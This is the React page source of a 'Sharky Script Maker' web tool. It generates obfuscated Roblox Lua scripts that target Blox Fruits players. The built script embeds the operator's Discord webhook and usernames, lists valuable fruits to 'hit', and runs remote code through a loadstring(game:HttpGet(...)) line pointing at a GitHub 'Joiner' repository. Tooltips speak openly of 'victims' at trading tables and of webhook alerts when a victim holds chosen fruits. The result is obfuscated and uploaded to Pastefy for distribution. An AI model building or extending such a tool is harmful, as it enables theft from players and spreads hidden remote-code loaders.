'use client';

import {useState, useEffect, useRef, useTransition} from 'react';
import {Button} from '@/components/ui/button';
import {Textarea} from '@/components/ui/textarea';
import {Checkbox} from '@/components/ui/checkbox';
import {Label} from '@/components/ui/label';
import {Input} from '@/components/ui/input';
import {Download, Copy, HelpCircle} from 'lucide-react';
import {useToast} from '@/hooks/use-toast';

import {obfuscateScript, ObfuscateScriptInput} from '@/ai/flows/obfuscate-script';
import ParticleComponent from '@/components/ParticleComponent';

import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip"
import {useIsMobile} from "@/hooks/use-mobile";

// --- Constants ---
const mythicalFruits = [
  'Kitsune-Kitsune', 'Yeti-Yeti', 'Gas-Gas', 'Leopard-Leopard', 'Control-Control',
  'Dough-Dough', 'T-Rex-T-Rex', 'Spirit-Spirit', 'Mammoth-Mammoth', 'Venom-Venom',
];
const legendaryFruits = [
  'Portal-Portal', 'Buddha-Buddha', 'Rumble-Rumble', 'Shadow-Shadow', 'Blizzard-Blizzard',
  'Sound-Sound', 'Phoenix-Phoenix', 'Pain-Pain', 'Gravity-Gravity', 'Love-Love',
  'Spider-Spider', 'Quake-Quake',
];
const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];

// --- Validation Patterns ---
// Combined Regex to accept standard Discord webhooks OR the protected format
const VALID_WEBHOOK_REGEX = /^(https:\/\/discord(app)?\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_-]+)|https:\/\/sharky-on-top\.script-config-protector\.workers\.dev\/w\/[a-zA-Z0-9-]+)$/;
const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/'; // Keep for backend check reference if needed

// --- Base loadstring part of the script ---
const BASE_LOADSTRING = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()';

// --- Error State Type ---
type WebhookErrorState = string | null;


export default function Home() {
  // --- State Variables ---
  const [webhookUrl, setWebhookUrl] = useState(''); // Accepts raw OR protected
  const [usernames, setUsernames] = useState('');
  const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
  const [configuredScript, setConfiguredScript] = useState('');
  const [obfuscatedScript, setObfuscatedScript] = useState('');
  const [pastefyLink, setPastefyLink] = useState('');
  const {toast} = useToast();
  const [isPending, startTransition] = useTransition();
  const isMobile = useIsMobile();
  const [tooltipStates, setTooltipStates] = useState({
      webhookUrl: false,
      usernames: false,
      fruitsToHit: false,
  });
  const [webhookError, setWebhookError] = useState<WebhookErrorState>(null);

  // --- Tooltip Logic ---
  const toggleTooltip = (field: keyof typeof tooltipStates) => {
      if (isMobile) {
          setTooltipStates(prevState => ({
              ...Object.fromEntries(
                  Object.keys(prevState).map(key => [key, false])
              ),
              [field]: !prevState[field],
          }));
      }
  };

  const isGenerating = isPending;

  // --- Generate Script Logic (MODIFIED) ---
  const generateScript = async () => {
    setWebhookError(null);
    setConfiguredScript('');
    setObfuscatedScript('');
    setPastefyLink('');

    // --- ** UPDATED: Validate Webhook URL (Accepts Raw OR Protected) ** ---
    if (!webhookUrl) {
        setWebhookError('Webhook URL is required.');
        toast({ title: 'Error', description: 'Webhook URL is required.', variant: 'destructive' });
        return;
    }
    // Validate against the combined regex
    if (!VALID_WEBHOOK_REGEX.test(webhookUrl)) {
        setWebhookError('Invalid format. Use a standard Discord webhook or your protected Sharky URL.');
        toast({ title: 'Error', description: 'Invalid Webhook URL format.', variant: 'destructive' });
        return;
    }
    // --- End Validation ---

    // Basic input checks
    if (!usernames.trim()) {
        toast({ title: 'Error', description: 'Usernames cannot be empty.', variant: 'destructive' });
        return;
    }
     if (selectedFruits.length === 0) {
        toast({ title: 'Error', description: 'Please select at least one fruit.', variant: 'destructive' });
        return;
    }

    // --- Prepare Data for Server Action ---
    let formattedUsernames = '';
    let formattedFruits = '';
    try {
      formattedUsernames = usernames
        .split('\n')
        .map(user => user.trim())
        .filter(user => user.length > 0)
        .map(user => `"${user}"`)
        .join(', ');

      formattedFruits = selectedFruits
        .map(fruit => `"${fruit}"`)
        .join(', ');

      if (!formattedUsernames) {
          toast({ title: 'Error', description: 'Valid usernames are required.', variant: 'destructive' });
          return;
      }

      // Display Example Configured Script Structure (Optional)
      const exampleConfigured = `Webhook = "[Your Final Webhook URL]"\n` + // Updated placeholder
                                `Usernames = {${formattedUsernames}}\n` +
                                `FruitsToHit = {${formattedFruits}}\n` +
                                `${BASE_LOADSTRING}`;
      setConfiguredScript(exampleConfigured);


      // --- Prepare input for the Server Action (Pass the potentially raw OR protected URL) ---
      const serverActionInput = {
          webhookUrl: webhookUrl, // Pass the URL as entered by the user
          usernamesLuaTable: `{${formattedUsernames}}`,
          fruitsLuaTable: `{${formattedFruits}}`,
          baseLoadstring: BASE_LOADSTRING
      };

      // --- Call the Server Action ---
      startTransition(async () => {
        try {
          const result = await obfuscateScript(serverActionInput); // Backend now handles protection if needed
          setObfuscatedScript(result.obfuscatedScript);
          setPastefyLink(result.pastefyLink);
          toast({
            title: 'Script Generated!',
            description: 'Webhook processed and script obfuscated successfully.', // Updated message
          });
        } catch (error: any) {
          console.error("Error during script generation:", error);
          toast({
            title: 'Error',
            description: `Failed to generate script: ${error.message}`,
            variant: 'destructive',
          });
          setObfuscatedScript('');
          setPastefyLink('');
          setConfiguredScript('');
        }
      });
    } catch (error: any) {
       console.error("Error formatting inputs:", error);
       toast({
        title: 'Error',
        description: `Failed to process inputs: ${error.message}`,
        variant: 'destructive',
      });
    }
  };

  // --- Other Handlers (handleFruitSelect, downloadScript, copyToClipboard - remain the same) ---
  const handleFruitSelect = (fruit: string) => { setSelectedFruits(prev => prev.includes(fruit) ? prev.filter(f => f !== fruit) : [...prev, fruit]); };
  const downloadScript = () => { /* ... download logic ... */ if (!obfuscatedScript) { toast({ title: 'Error', description: 'Please generate a script first.', variant: 'destructive' }); return; } const blob = new Blob([obfuscatedScript], {type: 'text/plain'}); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'roblox_script.lua'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); };
  const copyToClipboard = async (textToCopy: string, successMessage: string) => { if (!textToCopy) { toast({ title: 'Error', description: 'Nothing to copy.', variant: 'destructive' }); return; } try { await navigator.clipboard.writeText(textToCopy); toast({ title: 'Copied!', description: successMessage }); } catch (err) { console.error('Failed to copy text: ', err); toast({ variant: "destructive", title: "Copy Failed", description: "Could not copy script." }); } };


  // --- JSX Return ---
  return (
    <>
      <ParticleComponent />
      <div className="flex flex-col items-center justify-center min-h-screen p-4 text-gray-100">
        <div className="container mx-auto max-w-3xl w-full bg-gray-800 bg-opacity-80 p-8 rounded-lg border border-cyan-500/30 shadow-lg shadow-cyan-500/20 z-10 text-gray-100">

          <h1 className="text-3xl font-bold mb-8 text-center text-neon-blue-glow">
            Sharky Script Maker
          </h1>

          {/* Webhook Section (Label and Tooltip Updated) */}
          <div className="mb-4">
             <div className="flex items-center space-x-2 mb-2">
                {/* Updated Label */}
                <Label htmlFor="webhookUrl" className="text-cyan-400 font-bold">Discord Webhook URL</Label>
                <TooltipProvider>
                  <Tooltip
                    open={tooltipStates.webhookUrl}
                    onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, webhookUrl: open })}
                  >
                    <TooltipTrigger asChild>
                      <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('webhookUrl'); } }}>
                        <HelpCircle className="h-4 w-4 text-gray-400" />
                      </Button>
                    </TooltipTrigger>
                    {/* === Updated Tooltip Content === */}
                    <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                        <p className="mb-2">Enter your <b>standard Discord Webhook URL</b> OR your existing <b>Protected Sharky URL</b>.</p>
                        <p className="mb-2">Standard Discord URLs will be automatically protected.</p>
                        <p>This allows the script to send messages securely to your Discord channel.</p>
                    </TooltipContent>
                     {/* === End Updated Tooltip Content === */}
                  </Tooltip>
                </TooltipProvider>
              </div>
              <Input
                type="text"
                id="webhookUrl"
                value={webhookUrl}
                onChange={e => {
                    setWebhookUrl(e.target.value);
                    if (webhookError) setWebhookError(null);
                }}
                placeholder="Enter standard Discord or Protected Sharky URL" // Updated placeholder
                // Updated className for error state
                className={`w-full p-3 bg-gray-900 border rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent ${webhookError ? 'border-red-500' : 'border-cyan-500/50'}`}
              />
              {/* Updated Error Display */}
              {webhookError && (
                  <p className="mt-1 text-sm text-red-400">{webhookError}</p>
              )}
          </div>

          {/* Usernames Section (remains the same) */}
          <div className="mb-4">
              {/* ... (Label and Tooltip) ... */}
               <div className="flex items-center space-x-2 mb-2">
                <Label htmlFor="usernames" className="text-cyan-400 font-bold">Usernames (one per line)</Label>
                  <TooltipProvider>
                     <Tooltip
                      open={tooltipStates.usernames}
                      onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, usernames: open })}
                    >
                      <TooltipTrigger asChild>
                        <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('usernames'); } }}>
                          <HelpCircle className="h-4 w-4 text-gray-400" />
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                          <ul>
                            <li>Enter usernames of <b>YOUR</b> accounts.</li>
                            <li>These will be the accounts that can use the script's commands.</li>
                            <li>They will also be the ones sitting in trading tables with victims.</li>
                            <li>Put one Roblox username per line, with <b>no spaces</b>.</li>
                          </ul>
                      </TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
              </div>
              <Textarea
                id="usernames"
                value={usernames}
                onChange={e => setUsernames(e.target.value)}
                placeholder="Enter usernames, one per line"
                className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
                style={{fontFamily: 'Roboto Mono, monospace'}}
              />
          </div>

          {/* Fruits Section (remains the same) */}
          <div className="mb-4">
               {/* ... (Label and Tooltip) ... */}
               <div className="flex items-center space-x-2 mb-2">
                <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
                 <TooltipProvider>
                    <Tooltip
                      open={tooltipStates.fruitsToHit}
                      onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
                    >
                      <TooltipTrigger asChild>
                        <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('fruitsToHit'); } }}>
                          <HelpCircle className="h-4 w-4 text-gray-400" />
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
                          <ul>
                            <li>Select the fruits you want the script to detect.</li>
                            <li>You will get notified through your webhook on Discord if a victim has any of the selected fruits in their inventory.</li>
                          </ul>
                      </TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
              </div>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
                {/* ... (Checkbox mapping remains the same) ... */}
                 {sortedFruitsByRarity.map(fruit => (
                  <div key={fruit} className="flex items-center space-x-2">
                   <Checkbox
                      id={fruit}
                      checked={selectedFruits.includes(fruit)}
                      onCheckedChange={() => handleFruitSelect(fruit)}
                      className="border-cyan-500/50 data-[state=checked]:bg-cyan-500 data-[state=checked]:text-gray-900"
                    />
                    <label
                      htmlFor={fruit}
                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100"
                    >
                      {fruit}
                    </label>
                  </div>
                ))}
              </div>
          </div>

          {/* Generate Button (remains the same) */}
          <div className="mb-4">
            <Button onClick={generateScript} className="w-full mt-4 p-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-gray-900 font-bold rounded-md hover:from-cyan-400 hover:to-purple-500 transition duration-300 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed" disabled={isGenerating}>
              {isGenerating ? 'Generating...' : 'Generate Script'}
            </Button>
          </div>

          {/* Configured Script Output (Now shows example structure) */}
          {configuredScript && (
            <div className="mb-4">
              <div className="flex justify-between items-center mb-2">
                 <Label className="text-green-400 font-bold">Example Configured Script Structure</Label>
                 <Button
                    onClick={() => copyToClipboard(configuredScript, 'Example structure copied.')}
                    variant="outline" size="sm"
                    className="bg-gray-600 hover:bg-gray-500 text-gray-100 border-gray-500 px-2 py-1"
                    >
                    <Copy className="h-3 w-3 mr-1" /> Copy
                 </Button>
              </div>
              <Textarea
                value={configuredScript} readOnly
                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
                rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
              />
            </div>
          )}

          {/* Obfuscated Script Output (remains the same) */}
          {obfuscatedScript && (
            <div className="mb-4">
               {/* ... (Label, Copy Button, Pastefy Link) ... */}
                <div className="flex justify-between items-center mb-2">
                 <Label className="text-green-400 font-bold">Obfuscated Script</Label>
                 <Button
                    onClick={() => copyToClipboard(obfuscatedScript, 'Obfuscated script copied.')}
                    variant="outline" size="sm"
                    className="bg-green-600 hover:bg-green-500 text-gray-900 border-green-700 px-2 py-1"
                    >
                    <Copy className="h-3 w-3 mr-1" /> Copy
                 </Button>
              </div>
              {pastefyLink && (
                <div className="mb-2 text-sm">
                  <span className="text-gray-400">Pastefy Link: </span>
                  <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-cyan-400 hover:underline break-all">
                    {pastefyLink}
                  </a>
                </div>
              )}
              <Textarea
                value={obfuscatedScript} readOnly
                className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
                rows={8} style={{ fontFamily: 'Roboto Mono, monospace' }}
              />
            </div>
          )}

          {/* Download Button (remains the same) */}
           <Button
              onClick={downloadScript}
              className="w-full mt-4 p-4 border border-cyan-500/50 text-cyan-400 bg-gray-800 hover:bg-gray-700 rounded-md disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={!obfuscatedScript || isGenerating}
              variant="outline"
            >
              <Download className="mr-2 h-4 w-4" />
              Download Script
            </Button>

        </div>
      </div>
    </>
  );
}
